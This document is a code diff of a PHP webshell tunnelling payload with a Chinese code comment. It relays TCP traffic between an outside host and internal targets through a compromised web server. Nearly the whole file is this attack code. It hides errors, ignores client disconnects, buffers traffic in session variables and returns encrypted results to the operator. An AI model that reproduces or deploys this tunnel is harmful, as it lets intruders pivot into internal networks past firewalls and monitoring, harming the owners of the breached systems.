@@ -1,136 +1,124 @@
+<?
 @error_reporting(0);
+set_time_limit(0);
 function main($action, $targetIP = "", $targetPort = "", $socketHash = "", $remoteIP = "", $remotePort = "", $extraData = "")
 {
+    hookSemGetForWindows();
     switch ($action) {
         case "createRemote":
-            set_time_limit(0);
             //fastcgi_finish_request();
             @session_start();
             $_SESSION["remoteRunning"] = true;
             session_write_close();
-            global $read, $outers, $targets;
+            global $read,$write, $outers, $targets,$usedOuter;
             $ready = false;
             $outers = array();
             $targets = array();
             $read = array();
             $write = array();
+            $usedOuter=array();
             $exp = array();
-
+            $available=0;
             $read = array_merge($targets, $outers);
-            $init = true;
-            while ($_SESSION["remoteRunning"]===true) {
+            //finish();
+            while ($_SESSION["remoteRunning"] === true) {
 
-                if ($ready == false) {
+                //if ($ready == false) {
+                //if ($available==0) {
 
-                            $outtersocketObj = getSocket($remoteIP, $remotePort);
-                            $outterSocket = $outtersocketObj["s"];
-                            $s_type = $outtersocketObj["s_type"];
-                            $outers[intval($outterSocket)] = $outterSocket;
+                    $outtersocketObj = getSocket($remoteIP, $remotePort);
+                    $outterSocket = $outtersocketObj["s"];
+                    $s_type = $outtersocketObj["s_type"];
+                    //$key=stream_socket_get_name($outterSocket,false);
+                    $key=intval(explode(":",stream_socket_get_name($outterSocket,false))[1]);
+                    //$key=intval($outterSocket);
+                    $outers[$key] = $outterSocket;
 
-
-
-                            $socketRead = "socket_read";
-                            $socketWrite = "socket_write";
-                            $socketClose = "socket_close";
-                            $socketSelect = "socket_select";
-                            if ($s_type == 'stream') {
-                                $socketRead = "fread";
-                                $socketWrite = "fwrite";
-                                $socketClose = "fclose";
-                                $socketSelect = "stream_select";
-                            }
-                            $ready=true;
+                    $targetSocketObj = getSocket($targetIP, $targetPort);
+                    $targetSocket = $targetSocketObj["s"];
+                    $targets[$key] = $targetSocket;
 
 
-                }
+                    $socketRead = "socket_read";
+                    $socketWrite = "socket_write";
+                    $socketClose = "socket_close";
+                    $socketSelect = "socket_select";
+                    if ($s_type == 'stream') {
+                        $socketRead = "fread";
+                        $socketWrite = "fwrite";
+                        $socketClose = "fclose";
+                        $socketSelect = "stream_select";
+                    }
+                    $available++;
+                    $ready = true;
+                //}
                 $read = array();
                 $read = array_merge($targets, $outers);
-                if ($socketSelect($read, $write, $exp, 0) > 0) {
+                $exp = array_merge($targets, $outers);
+                //sleep(3);
 
+
+                while ($socketSelect($read, $write=NULL, $exp=NULL, NULL)>0) {
                     foreach ($read as $socket_item) {
                         if (in_array($socket_item, $outers)) {
-
-                            $key = intval($socket_item);
+                            $key=intval(explode(":",stream_socket_get_name($socket_item,false))[1]);
+                            $usedOuter[$key]=true;
+                            //$key=stream_socket_get_name($socket_item,false);
                             if (isset($targets[$key])) {
                                 $content = $socketRead($socket_item, 204800);
                                 if (strlen($content) > 0) {
                                     $socketWrite($targets[$key], $content, strlen($content));
                                 } else {
-                                    $ready = false;
+                                    //$ready = false;
                                     $socketClose($socket_item);
                                     $socketClose($targets[$key]);
                                     unset($outers[$key]);
+                                    unset($usedOuter[$key]);
                                     unset($targets[$key]);
-                                    continue;
+                                    //break;
                                 }
-                            } else {
-                                $targetSocketObj = getSocket($targetIP, $targetPort);
-                                $targetSocket = $targetSocketObj["s"];
-                                $targets[$key] = $targetSocket;
-                                $content = $socketRead($socket_item, 204800);
-                                if (strlen($content) > 0) {
-                                    $socketWrite($targetSocket, $content, strlen($content));
-                                } else {
-                                    $ready = false;
-                                    $socketClose($socket_item);
-                                    $socketClose($targetSocket);
-                                    unset($outers[$key]);
-                                    unset($targets[$key]);
-                                    continue;
-                                }
-                                continue;
                             }
                         }
                         if (in_array($socket_item, $targets)) {
-
                             foreach ($targets as $k => $v) {
-                                if ($socket_item == $v) {
+                                if ($socket_item === $v) {
                                     if (isset($outers[$k])) {
                                         $content = $socketRead($socket_item, 204800);
-
                                         if (strlen($content) > 0) {
                                             $socketWrite($outers[$k], $content, strlen($content));
                                         } else {
-
-                                            /*$ready = false;
-                                            socket_close($socket_item);
-                                            socket_close($outers[$k]);
+                                            $socketClose($socket_item);
+                                            $socketClose($outers[$k]);
                                             unset($targets[$k]);
-                                            unset($outers[$k]);*/
-                                            continue;
+                                            unset($outers[$k]);
+                                            unset($usedOuter[$k]);
+                                            //break;
                                         }
-                                    } else {
-
-
-                                        $socketClose($socket_item);
-                                        unset($targets[$k]);
-                                        $ready = false;
-                                        continue;
                                     }
-
-
-                                    /*$content = socket_read($socket_item, 2048);
-                                    if (strlen($content)==0)
-                                    {
-                                        unset($targets[$k]);
-                                        continue;
-                                    }
-                                    socket_write($outers[$k], $content, strlen($content));*/
                                 }
                             }
                         }
+
+                    }
+                    $read = array_merge($targets, $outers);
+                    if ((count($outers)>count($usedOuter)))
+                    {
+                        continue;
+                    }
+                    else
+                    {
+                        break;
                     }
                 }
 
                 // 当select没有监听到可操作fd的时候，直接continue进入下一次循环
-                else {
-                    continue;
-                }
+                   // logs("select ===0");
+                   // sleep(5);
             }
             break;
         case "createLocal":
 
-            $localSocketObj=getSocket($targetIP,$targetPort);
+            $localSocketObj = getSocket($targetIP, $targetPort);
             $localSocket = $localSocketObj["s"];
             $s_type = $localSocketObj["s_type"];
             if ($s_type == 'error') {
@@ -140,167 +128,172 @@ function main($action, $targetIP = "", $targetPort = "", $socketHash = "", $remo
 
 
 
-                                        $socketRead = "socket_read";
-                                        $socketWrite = "socket_write";
-                                        $socketClose = "socket_close";
-                                        $socketSelect = "socket_select";
-                                        if ($s_type == 'stream') {
-                                            $socketRead = "fread";
-                                            $socketWrite = "fwrite";
-                                            $socketClose = "fclose";
-                                            $socketSelect = "stream_select";
-                                        }
-            if ($s_type=='stream')
-            {
-                stream_set_blocking($localSocket,false );
+            $socketRead = "socket_read";
+            $socketWrite = "socket_write";
+            $socketClose = "socket_close";
+            $socketSelect = "socket_select";
+            if ($s_type == 'stream') {
+                $socketRead = "fread";
+                $socketWrite = "fwrite";
+                $socketClose = "fclose";
+                $socketSelect = "stream_select";
             }
-            else
-            {
+            if ($s_type == 'stream') {
+                stream_set_blocking($localSocket, false);
+            } else {
                 socket_set_nonblock($localSocket);
             }
 
             @session_start();
-            $_SESSION["local_running".$socketHash] = true;
-            $_SESSION["writebuf".$socketHash] = "";
-            $_SESSION["readbuf".$socketHash] = "";
+            $_SESSION["local_running" . $socketHash] = true;
+            $_SESSION["writebuf" . $socketHash] = "";
+            $_SESSION["readbuf" . $socketHash] = "";
             session_write_close();
-            ob_end_clean();
-            header("Connection: close");
-            ignore_user_abort();
-            ob_start();
-            $size = ob_get_length();
-            header("Content-Length: $size");
-            ob_end_flush();
-            flush();
 
-            while ($_SESSION["local_running".$socketHash]) {
+            finish();
+            $idleCount=0;
+            while ($_SESSION["local_running" . $socketHash]) {
                 $readBuff = "";
-                @session_start();
-                $_SESSION["localPortMapLock".$socketHash] = "true";
-                $writeBuff = $_SESSION["writebuf".$socketHash];
-                $_SESSION["writebuf".$socketHash] = "";
-                $_SESSION["localPortMapLock".$socketHash] = "false";
-                session_write_close();
+
+                //$semRes = sem_get((int)hexdec($socketHash), 1, 0666, 0); 
+                //if (sem_acquire($semRes)) { 
+                    @session_start();
+                    $writeBuff = $_SESSION["writebuf" . $socketHash];
+                    $_SESSION["writebuf" . $socketHash] = "";
+                    session_write_close();
+                    //sem_release($semRes);
+                //}
+                
                 if ($writeBuff != "") {
+                    $idleCount=0;
                     $i = $socketWrite($localSocket, $writeBuff, strlen($writeBuff));
                     if ($i === false) {
                         @session_start();
-                        $_SESSION["local_running".$socketHash] = false;
+                        $_SESSION["local_running" . $socketHash] = false;
                         session_write_close();
                         echo "\x37\x21\x49\x36Failed writing socket";
                     }
                 }
+                else
+                {
+                    $idleCount++;
+                }
                 while ($o = $socketRead($localSocket, 20480)) {
                     if ($o === false) {
                         @session_start();
-                        $_SESSION["local_running".$socketHash] = false;
+                        $_SESSION["local_running" . $socketHash] = false;
                         session_write_close();
                         echo "\x37\x21\x49\x36Failed reading from socket";
                     }
                     $readBuff .= $o;
                 }
                 if ($readBuff != "") {
-                    @session_start();
-                    $_SESSION["readbuf".$socketHash] .= $readBuff;
-                    session_write_close();
+                    $idleCount=0;
+                    $semRes = sem_get((int)hexdec($socketHash), 1, 0666, 0); 
+                    if (sem_acquire($semRes)) { 
+                        @session_start();
+                        $_SESSION["readbuf" . $socketHash] .= $readBuff;
+                        session_write_close();
+                        sem_release($semRes);
+                    }
+
+                }
+                else
+                {
+                    $idleCount++;
+                }
+                if ($idleCount>100000)
+                {
+                    //sleep(1);
                 }
                 #sleep(0.2);
             }
             $socketClose($localSocket);
             break;
         case "read":
-
             @session_start();
-            $readBuffer = $_SESSION["readbuf".$socketHash];
-            $_SESSION["readbuf".$socketHash] = "";
-            $running = $_SESSION["local_running".$socketHash];
-            session_write_close();
-
-            if (isset($_SESSION["local_running".$socketHash]))
-            {
-                if ($running) {
-                            header("Connection: Keep-Alive");
-                            echo $readBuffer;
-                            return;
-                        } else if ($running===false){
-                            echo "\x37\x21\x49\x36RemoteSocket read filed";
-                            return;
-                        }
+            if (isset($_SESSION["local_running" . $socketHash])==false||$_SESSION["local_running" . $socketHash]==false) {
+                @session_write_close();
+                $result["status"] = base64_encode("fail");
+                    $result["msg"] = base64_encode("tunnel is not running in server");
+                    echo encrypt(json_encode($result));
+                    return;
             }
+            @session_write_close();
+            $result = array();
 
-            break;
-        case "write": {
-        //header('Content-Type: application/octet-stream');
-                                $rawPostData = base64_decode($extraData);
-                                if ($rawPostData) {
-
-                                 while(true)
-                                 {
-                                 //sleep(1);
-                                 @session_start();
-                                 session_write_close();
-                                  if ($_SESSION["localPortMapLock".$socketHash]==="false")
-                                  {
-                                     @session_start();
-                                      $_SESSION["writebuf".$socketHash] .= $rawPostData;
-                                      session_write_close();
-                                      break;
-                                  }
-                                 }
-
-                                    header("Connection: Keep-Alive");
-                                    return;
-                                } else {
-                                    echo "\x37\x21\x49\x36POST request read filed";
-                                }
-                /*@session_start();
-                $running = $_SESSION["local_running".$socketHash];
+            $semRes = sem_get((int)hexdec($socketHash), 1, 0666, 0); 
+            if (sem_acquire($semRes)) { 
+                @session_start();
+                $readBuffer = $_SESSION["readbuf" . $socketHash];
+                $_SESSION["readbuf" . $socketHash] = "";
+                $running = $_SESSION["local_running" . $socketHash];
                 session_write_close();
-                file_put_contents("status.txt", "write startd before runig" . "\n", FILE_APPEND);
-                if (isset($_SESSION["local_running".$socketHash]))
-                {
-                                if (!$running) {
-                                    echo "\x37\x21\x49\x36No more running, close now";
-                                    return;
-                                }
-                                header('Content-Type: application/octet-stream');
-                                $rawPostData = base64_decode($extraData);
-                                file_put_contents("status.txt", "write to: " . $extraData . "\n", FILE_APPEND);
-                                if ($rawPostData) {
-                                    @session_start();
-                                    $_SESSION["writebuf".$socketHash] .= $rawPostData;
-                                    session_write_close();
-                                    header("Connection: Keep-Alive");
-                                    return;
-                                } else {
-                                    echo "\x37\x21\x49\x36POST request read filed";
-                                }
-
-                }*/
-
+                sem_release($semRes);
             }
+            $result["status"] = base64_encode("success");
+            $result["msg"] = base64_encode(base64_encode($readBuffer));
+            echo encrypt(json_encode($result));
+            break;
+        case "write": 
+                //header('Content-Type: application/octet-stream');
+                $result = array();
+                $rawPostData = base64_decode($extraData);
+                if ($rawPostData) {
+
+                    $semRes = sem_get((int)hexdec($socketHash), 1, 0666, 0); 
+
+                    if (sem_acquire($semRes)) { 
+                        @session_start();
+                        $_SESSION["writebuf" . $socketHash] .= $rawPostData;
+                        @session_write_close();
+                        sem_release($semRes);
+                    }
+                }
+                $result["status"] = base64_encode("success");
+                $result["msg"] = base64_encode("ok");
+                echo encrypt(json_encode($result));
+            
             break;
         case "closeLocal":
             @session_start();
             $running = $_SESSION["local_running"] = false;
+            foreach($_SESSION as $key=>$value)
+            {
+                if (strpos($key,"local_running")>=0)
+                {
+                    unset($_SESSION[$key]);
+                }
+            }
+            //unset($_SESSION["local_running" . $socketHash]);
             session_write_close();
+            $result["status"] = base64_encode("success");
+            $result["msg"] = base64_encode("ok");
+            echo encrypt(json_encode($result));
             break;
         case "closeLocalWorker":
             @session_start();
-            $running = $_SESSION["local_running".$socketHash] = false;
+            //$running = $_SESSION["local_running" . $socketHash] = false;
+            unset( $_SESSION["local_running" . $socketHash]);
             session_write_close();
+            $result["status"] = base64_encode("success");
+            $result["msg"] = base64_encode("ok");
+            echo encrypt(json_encode($result));
             break;
 
         case "closeRemote":
             @session_start();
             $_SESSION["remoteRunning"] = false;
             session_write_close();
+            $result["status"] = base64_encode("success");
+            $result["msg"] = base64_encode("ok");
+            echo encrypt(json_encode($result));
             break;
     }
 }
 function getSocket($ip, $port)
 {
-    $resultObj=array();
+    $resultObj = array();
     if (($f = 'stream_socket_client') && is_callable($f)) {
         $s = $f("tcp://{$ip}:{$port}");
         $s_type = 'stream';
@@ -318,14 +311,45 @@ function getSocket($ip, $port)
         $s_type = 'socket';
     }
     if (!$s_type) {
-        $s_type="error";
-        $s='no socket funcs';
+        $s_type = "error";
+        $s = 'no socket funcs';
     }
     if (!$s) {
-        $s_type="error";
-        $s='no socket';
+        $s_type = "error";
+        $s = 'no socket';
     }
-    $resultObj["s"]=$s;
-    $resultObj["s_type"]=$s_type;
+    $resultObj["s"] = $s;
+    $resultObj["s_type"] = $s_type;
     return $resultObj;
+}
+function finish()
+{
+    ob_end_clean();
+    header("Connection: close");
+    ignore_user_abort();
+    ob_start();
+    $size = ob_get_length();
+    header("Content-Length: $size");
+    ob_end_flush();
+    flush();
+}
+
+
+function hookSemGetForWindows()
+{
+    if(!function_exists("sem_get"))
+{
+    function sem_get($a,$b,$c,$d)
+    {
+        return true;
+    }
+    function sem_release($a)
+    {
+        
+    }
+    function sem_acquire($a)
+    {
+        return true;
+    }
+}
 }
